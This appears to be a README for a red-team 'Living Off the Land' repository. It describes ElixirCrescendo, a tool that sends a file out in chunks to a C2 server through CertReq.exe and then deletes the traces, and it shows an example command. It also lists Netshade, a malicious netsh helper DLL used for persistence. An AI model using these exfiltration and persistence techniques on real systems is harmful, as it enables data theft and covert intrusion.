# Living Off the Land

Includes findings, POC's, notes, etc realted to LOL.



### ElixirCrescendo
```
  *  *  * ElixirCrescendo *  *  *
             O*  .
               0   *
              .   o
             o   .
           _________
         c(`       ')o
           \.     ,/
          _//^---^\\_
  --CertReq.exe Exfil Wrapper--

Example:
    C:\>ElixirCrescendo.exe "C:\CoolFolder\juicy_file.zip"
```

Send a chunked file via a HTTP POST request using the built-in signed binary CertReq.exe. C# app will encode file, chunk into 63KB files (since certreq can only send less than 64KB per request), send each to specified C2 then delete the local chunked files. Just setup your C2 to write/log the content of incoming POST requests.


### Netshade

An evil netsh helper dll. https://attack.mitre.org/techniques/T1546/007/
